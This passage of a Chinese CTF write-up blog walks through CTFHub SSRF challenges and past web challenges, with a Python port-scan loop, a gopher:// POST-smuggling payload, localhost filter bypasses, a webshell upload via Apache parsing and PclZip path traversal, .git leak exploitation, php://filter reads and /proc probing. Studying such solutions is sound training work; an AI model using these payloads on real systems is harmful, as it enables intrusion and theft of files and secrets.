Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</code></pre><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>题目提示：来来来性感CTFHub在线扫端口,据说端口范围是8000-9000哦</p><p>方法一（bp进行端口爆破）：</p><p>爆破格式为</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52212_2.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8813%E6%97%A52213_3.png" alt></p><p>响应中查看</p><p>方法二：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'http://challenge-48d05bc5759898a5.sandbox.ctfhub.com:10080/?url=127.0.0.1:'</span>port<span class="token operator">=</span><span class="token number">8000</span><span class="token keyword">while</span> port<span class="token operator">&lt;=</span><span class="token number">9000</span><span class="token punctuation">:</span>    Wholeurl<span class="token operator">=</span>url<span class="token operator">+</span>str<span class="token punctuation">(</span>port<span class="token punctuation">)</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>Wholeurl<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>Wholeurl<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        <span class="token keyword">break</span>    port<span class="token operator">=</span>port<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"over"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>py脚本进行爆破</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//QQ%E5%9B%BE%E7%89%8720210114112554.png" alt></p><p>（1/13）</p><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><h4 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h4><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年</p><h4 id="扫盲：-1"><a href="#扫盲：-1" class="headerlink" title="扫盲："></a>扫盲：</h4><p><a href="https://mp.weixin.qq.com/s/umNUpdz6Mqvhlgqu4-9NCQ" target="_blank" rel="noopener">Gopher协议与redis未授权访问</a></p><h4 id="自动组装gopher工具："><a href="#自动组装gopher工具：" class="headerlink" title="自动组装gopher工具："></a>自动组装gopher工具：</h4><p><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p><h4 id="开始解题："><a href="#开始解题：" class="headerlink" title="开始解题："></a>开始解题：</h4><p>1.读取flag.php</p><p>利用file://协议去读取<code>?url=file:///var/www/html/flag.php</code></p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><?phperror_reporting(0);if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") { //检测你请求的ip地址，这里是你挂的代理的ip没挂就是真实ip    echo "Just View From 127.0.0.1";    return;}$flag=getenv("CTFHUB");//从环境中取字符串变量取得当前系统的环境变量$key = md5($flag);if (isset($_POST["key"]) && $_POST["key"] == $key) {    echo $flag;    exit;}?><form action="/flag.php" method="post"><input type="text" name="key"><!-- Debug: key=<?php echo $key;?>--></form> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再读取index.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: /?url=_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_FOLLOWLOCATION</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>index中明显提到如果不设置location就会被一直重定向到这个?url=_这个页面</p><p>2.关于flag.php：</p><p>你需要post传入key的值</p><p><code>?url=127.0.0.1/flag.php</code></p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><form action="/flag.php" method="post"><input type="text" name="key"><!-- Debug: key=0d6a7b9d0c4718d8fa37ad3f9d527d24--></form><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>3.利用gopher协议去传入post值</p><p>首先想要gopher协议传入post值需要提前准备<code>Content-Type</code>,<code>Content-Length</code>,<code>host</code>,<code>post</code>的参数，这个通过burp获取：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">POST</span> <span class="token operator">/</span>flag<span class="token punctuation">.</span>php <span class="token constant">HTTP</span><span class="token operator">/</span><span class="token number">1.1</span>Host<span class="token punctuation">:</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">80</span>Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">36</span> <span class="token comment" spellcheck="true">//此处为你post传入值的长度，也就是key字段</span>Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded <span class="token comment" spellcheck="true">//application/x-www-form-urlencoded（将键值对的参数用&amp;连接起来，如果有空格，将空格转换为+加号；有特殊符号，将特殊符号转换为ASCII HEX值）,如果参数值中需要&amp;，则必须对其进行编码。</span>key<span class="token operator">=</span>0d6a7b9d0c4718d8fa37ad3f9d527d24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中细节：</p><p>每个参数之间是需要回车换行的所以要紧跟%0d%0a</p><p>构造POST请求：</p><pre><code>POST%20%2Fflag.php%20HTTP%2F1.1%0AHost%3A%20127.0.0.1%3A80%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0AContent-Length%3A%2036%0A%0Akey%3D0d6a7b9d0c4718d8fa37ad3f9d527d24</code></pre><p>换行处理：</p><pre><code>POST%20%2Fflag.php%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%3A80%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Akey%3D0d6a7b9d0c4718d8fa37ad3f9d527d24</code></pre><p>payload构造：</p><pre><code>?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520http%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D0d6a7b9d0c4718d8fa37ad3f9d527d24</code></pre><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>描述：请求的URL中必须包含<a href="http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧" target="_blank" rel="noopener">http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧</a></p><p>?url=<a href="http://notfound.ctfhub.com@127.0.0.1/flag.php" target="_blank" rel="noopener">http://notfound.ctfhub.com@127.0.0.1/flag.php</a></p><h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><p>描述：这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢</p><p><del>看了大佬的wp</del>：</p><ol><li>8进制格式：0177.00.00.01</li><li>16进制格式：0x7f.0x0.0x0.0x1</li><li>10进制整数格式：2130706433</li><li>在linux下，0代表127.0.0.1，<a href="http://0进行请求127.0.0.1" target="_blank" rel="noopener">http://0进行请求127.0.0.1</a></li></ol><p>?url=0/flag.php</p><h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p>描述：SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧</p><p>?url=127.0.0.1/flag.php</p><h6 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h6><p>关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助</p><p><del>搜集wp信息</del>：</p><p>我们这里还是使用DNS重绑定，在网络上存在一个很神奇的服务，<a href="http://xip.io/" target="_blank" rel="noopener">http://xip.io</a> 当我们访问这个网站的子域名的时候，例如127.0.0.1.xip.io，就会自动重定向到127.0.0.1。<br>即：?url=127.0.0.1.xip.io/flag.php</p><p>但是这个题直接这样也可以</p><p>?url=127.0.0.1/flag.php</p><p>毕竟都是定向到127.0.0.1</p><h1 id="历年真题-WEB-："><a href="#历年真题-WEB-：" class="headerlink" title="历年真题(WEB)："></a>历年真题(WEB)：</h1><h2 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><p>1.apache文件解析漏洞：影响版本为apache 2.4.0-2.4.29</p><p>2.针对php中第三方解压pclzip的漏洞</p><h3 id="函数理解："><a href="#函数理解：" class="headerlink" title="函数理解："></a>函数理解：</h3><p><a href="https://www.baidu.com/link?url=7LGyFXNc0qzo9rbSaNvdsdwYfAcvtUEjTkpFyAv2jwTT4ZYvmtKP8yV0B01uYftchVyH4BsZthWqYE4aP0JH5VAp5IhYlNR8DQU0or2LZhG&wd=&eqid=bd9a86d40011433c00000003608a9e79" target="_blank" rel="noopener">PHP strrchr() 函数</a>：strrchr(123456789,2)在2处规定的字符，会返回从该位置到字符串结尾的所有字符：23456789，此题中可以利用此函数来得到后缀</p><p>opendir()函数：打开目录句柄，相当于ls命令</p><p>unlink()函数：删除文件，如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p><p><a href="https://www.runoob.com/php/func-array-extract.html" target="_blank" rel="noopener">extract()函数</a>：从关联数组中提取变量 <strong><em>（键为变量名，值为变量值）</em></strong>，导入系统，此函数就类似于弄了一个数组，也可以理解为一个表来将目前已经存在的变量，重新覆盖，并且可以利用其中的规则，将重新覆盖的变量标注出来</p><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type:text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 每5分钟会清除一次目录下上传的文件</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'pclzip.lib.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'这里本来是前端页面我直接删了没用'</span><span class="token punctuation">;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"请勿上传空文件"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string">'upload/'</span><span class="token punctuation">;</span>    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">check_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//打开文件路径</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//$f是否存在于该路径下，存在则继续</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//$f中是否含有.和..等字符，没有则继续</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//判断是否为一个目录</span>                    <span class="token function">check_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$f</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//然后继续重复check_dir的操作</span>                 <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//如果不是一个目录，那么开始判断是否为正常文件</span>                    <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>删除这个非法文件                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$temp_dir</span> <span class="token operator">=</span> <span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$temp_dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$temp_dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'zip'</span><span class="token punctuation">,</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">,</span> <span class="token string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string">'zip'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$archive</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PclZip</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">listContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\.php$/'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"压缩包内不允许含有php文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token constant">PCLZIP_OPT_PATH</span><span class="token punctuation">,</span> <span class="token variable">$temp_dir</span><span class="token punctuation">,</span> <span class="token constant">PCLZIP_OPT_REPLACE_NEWER</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"解压失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token function">check_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token function">check_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'上传成功!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$temp_dir</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">check_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'上传成功!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'仅允许上传zip、jpg、gif、png文件!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><h4 id="第一步的绕过："><a href="#第一步的绕过：" class="headerlink" title="第一步的绕过："></a>第一步的绕过：</h4><p>利用apache的文件解析漏洞来实现php文件能够执行：</p><p>需要将带有木马的php文件名字改为1.php.111，让111无法被是被然后继续向左来识别php来确定文件类型</p><h4 id="第二步的绕过："><a href="#第二步的绕过：" class="headerlink" title="第二步的绕过："></a>第二步的绕过：</h4><p>在源代码中由定义check_dir函数方法来检查目录的情况，如果不是一个目录的话，会删除这个非法文件，并提示解压失败，所以要构造的特殊压缩包（解压到一半在突出）的方法不可取，所以利用pclzip的已知漏洞：目录穿越问题。如果解压出的文件能都逃掉check_dir这一环节那么解压出的问价就不会被删除。</p><p>源代码可以知道所上传的文件在upload/md5/目录下的，所以要穿越两层：../../</p><h3 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h3><p>1.生成带有木马的名字为xxxxxxx.php.xxx的文件，然后生成压缩包</p><p>2.010editer打开zip文件：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8830%E6%97%A51922_2.png" alt></p><p>修改这个地方，这里也就体现出了名字为什么一开始设置为7个x了</p><p>然后把这个zip上传，然后访问x.php.xxx就能得到flag</p><h2 id="粗心的小李"><a href="#粗心的小李" class="headerlink" title="粗心的小李"></a>粗心的小李</h2><h3 id="考点：-1"><a href="#考点：-1" class="headerlink" title="考点："></a>考点：</h3><p>git文件泄露</p><h3 id="思路：-1"><a href="#思路：-1" class="headerlink" title="思路："></a>思路：</h3><p>githack工具利用</p><h3 id="解题：-1"><a href="#解题：-1" class="headerlink" title="解题："></a>解题：</h3><pre><code>git clone https://github.com/BugScanTeam/GitHackcd GitHackpython GitHack.py http://challenge-df81f549db86830c.sandbox.ctfhub.com:10080/.git</code></pre><p>会得到indedx.html同时flag也被部署到了前端</p><h2 id="常见的收集"><a href="#常见的收集" class="headerlink" title="常见的收集"></a>常见的收集</h2><h3 id="考点：-2"><a href="#考点：-2" class="headerlink" title="考点："></a>考点：</h3><p>敏感文件</p><h3 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h3><p>御剑或者burp配合字典半自动化搜索</p><h3 id="解题：-2"><a href="#解题：-2" class="headerlink" title="解题："></a>解题：</h3><p>实际暴露的敏感信息：</p><p>robots.txt </p><p>index.php~ </p><p>.index.php.swp</p><p>然后拼接这三部分的flag</p><h2 id="afr-1"><a href="#afr-1" class="headerlink" title="afr-1"></a>afr-1</h2><h3 id="考点：-3"><a href="#考点：-3" class="headerlink" title="考点："></a>考点：</h3><p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html" target="_blank" rel="noopener">php中伪协议总结</a>：</p><p>php://filter伪协议的利用</p><p>条件：</p><p>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。</p><h3 id="思路：-3"><a href="#思路：-3" class="headerlink" title="思路："></a>思路：</h3><p>直接构造payload</p><h3 id="解题：-3"><a href="#解题：-3" class="headerlink" title="解题："></a>解题：</h3><p>payload：</p><pre><code>?p=php://filter/read=convert.base64-encode/resource=flag</code></pre><p>得：</p><pre><code>&lt;?phpdie(&#39;no no no&#39;);//n1book{afr_1_solved}</code></pre><h2 id="afr-2"><a href="#afr-2" class="headerlink" title="afr-2"></a>afr-2</h2><h3 id="考点：-4"><a href="#考点：-4" class="headerlink" title="考点："></a>考点：</h3><p>目录穿越</p><h3 id="解题：-4"><a href="#解题：-4" class="headerlink" title="解题："></a>解题：</h3><p>打开一看，发现精神小伙，f12发现来自img</p><p><a href="http://challenge-63b251d2430d82a1.sandbox.ctfhub.com:10080/img../" target="_blank" rel="noopener">http://challenge-63b251d2430d82a1.sandbox.ctfhub.com:10080/img../</a></p><p>打开目录下面的flag下载得</p><p>n1book{afr_2_solved}</p><h2 id="afr-3"><a href="#afr-3" class="headerlink" title="afr-3"></a>afr-3</h2><h3 id="考点：-5"><a href="#考点：-5" class="headerlink" title="考点："></a>考点：</h3><p>1.目录穿越</p><p>2.对linux/proc目录的较为深层次的理解：</p><p> /proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录。</p><p>对应目录下的cmdline可读出比较敏感的信息，</p><p>Linux系统上的/proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。<br>/proc/[pid],当查看当前进程的时候可以用/proc/self代替<br>cmdline — 启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息<br>cwd — 指向当前进程运行目录的一个符号链接<br>environ — 